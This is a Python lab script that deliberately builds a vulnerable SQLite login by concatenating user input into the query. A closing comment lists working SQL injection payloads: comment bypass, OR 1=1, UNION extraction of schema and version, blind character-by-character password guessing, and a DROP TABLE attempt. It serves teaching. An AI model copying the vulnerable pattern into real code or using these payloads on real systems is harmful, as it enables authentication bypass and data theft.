import sqlite3

def setup_database():
    """Sets up an in-memory database with a users table and dummy data."""
    conn = sqlite3.connect(':memory:') # Creates a temporary DB in RAM
    cursor = conn.cursor()
    
    # Create a table
    cursor.execute('''
        CREATE TABLE users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            role TEXT
        )
    ''')
    
    # Insert dummy users
    users = [
        ('admin', 'SuperSecretPass123', 'admin'),
        ('alice', 'aliceiscool', 'user'),
        ('bob', 'password123', 'user')
    ]
    cursor.executemany('INSERT INTO users (username, password, role) VALUES (?, ?, ?)', users)
    conn.commit()
    return conn

def vulnerable_login(conn, username, password):
    """
    VULNERABLE FUNCTION: This function directly concatenates user input 
    into the SQL string, making it susceptible to SQL Injection.
    """
    cursor = conn.cursor()
    
    # --- THE VULNERABILITY IS HERE ---
    # Using f-strings or string concatenation to build queries allows
    # malicious input to alter the logic of the SQL statement.
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    '''
  Because the code takes the username string exactly as you type it and pastes it into the SQL command, you can use special SQL characters (like ', --, or OR) to change what the command does.
    '''
    print(f"\n[DEBUG] Executing Query: {query}") # Printing for educational purposes
    
    try:
        cursor.execute(query) # Executing the compromised query
        user = cursor.fetchone()
        
        if user:
            print(f"Login Successful! Welcome, {user[1]} (Role: {user[3]})")
            return True
        else:
            print(" Login Failed: Invalid credentials.")
            return False
    except sqlite3.Error as e:
        print(f" Database Error: {e}")
        return False

# --- Main Execution Block ---
if __name__ == "__main__":
    db_connection = setup_database()
    
    print("--- Vulnerable Login System ---")
    print("Try to login as 'admin' without knowing the password.")
    
    user_input = input("Enter Username: ")
    pass_input = input("Enter Password: ")
    
    vulnerable_login(db_connection, user_input, pass_input)
    
    db_connection.close()
    
    
    
    
'''    1. Authentication Bypass (The "Let Me In" Attacks)
These exploit the logic to log you in as the first user found in the database (which is admin in your script) or a specific user, without knowing the password.

A. The Comment Bypass
Goal: Ignore the password check entirely.

Username Input: admin' --

Password Input: (anything)

Resulting Query:

SQL
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
Why it works: The -- tells SQLite that everything following it is a comment. The database stops reading after 'admin', so the password requirement never happens.

B. The Tautology (The "Always True")
Goal: Log in as the first user in the database (Admin) by making the condition mathematically true.

Username Input: ' OR 1=1 --

Password Input: (anything)

Resulting Query:

SQL
SELECT * FROM users WHERE username = '' OR 1=1 --' ...
Why it works: 1=1 is always true. Since we used OR, the database looks for a match where the username is blank OR where 1 equals 1. Since 1 always equals 1, it returns the first record it finds (Admin).

2. UNION-Based Injection (The "Data Theft" Attacks)
This is more dangerous. It allows you to append results from a different query to the original results. Because your script prints the user's name and role (print(f"...Welcome, {user[1]}...")), we can make the database print whatever data we want.

Note: The script selects 4 columns (id, username, password, role). Your injected UNION must also select exactly 4 columns for this to work.

A. Fake User Injection
Goal: Trick the application into logging you in as a user that doesn't exist.

Username Input: ' UNION SELECT 99, 'Hacker', 'fake_pass', 'GodMode' --

Password Input: (anything)

Resulting Query:

SQL
SELECT * FROM users WHERE username = '' ...
UNION SELECT 99, 'Hacker', 'fake_pass', 'GodMode' -- ...
What happens: The first part (searching for username '') fails. The second part 
(UNION) succeeds and manually creates a row.

Script Output:  Login Successful! Welcome, Hacker (Role: GodMode)

B. Stealing Database Structure (Schema)
Goal: Find out what other tables exist in the database. SQLite keeps a master list of tables in a system 
table called sqlite_master.

Username Input: ' UNION SELECT 1, sql, '3', '4' FROM sqlite_master --

Password Input: (anything)

Why it works: Instead of a username, we ask the DB to return the sql column from sqlite_master.

Script Output: It will likely print the SQL command used to create the users table (CREATE TABLE users...)
instead of the username.

C. Version Extraction
Goal: Find out the version of the database software.

Username Input: ' UNION SELECT 1, sqlite_version(), '3', '4' --

Script Output: Welcome, 3.xx.x (The version number).

3. Boolean/Blind Inference (The "Guessing Game")
If the application didn't print the username, you could still extract data by asking "True/False" questions.
If the login succeeds, the answer is True.

A. Password Length Guesser
Goal: Find out exactly how long the admin's password is.

Username Input: admin' AND length(password)=18 --

Password Input: (anything)

What happens:

If the password is exactly 18 characters, the login Succeeds.

If it is not 18, the login Fails.

Note: In the script, the admin password SuperSecretPass123 is 18 characters long.

B. Password Character Guesser
Goal: Guess the first letter of the password.

Username Input: admin' AND substr(password, 1, 1)='S' --

What happens: We ask, "Is the first letter of the password 'S'?"

If yes -> Login Successful.

If no -> Login Failed.

You can automate this to dump the whole password character by character.

What WON'T Work (And Why)
You might try to delete the database using a Stacked Query:

Input: admin'; DROP TABLE users; --

This will likely fail. Why? The standard Python sqlite3.execute() function prevents executing multiple 
SQL statements separated by a semicolon (;) to protect against exactly this type of destructive attack. 
To make that work, the programmer would have had to use cursor.executescript(), which is rare in login 
forms.'''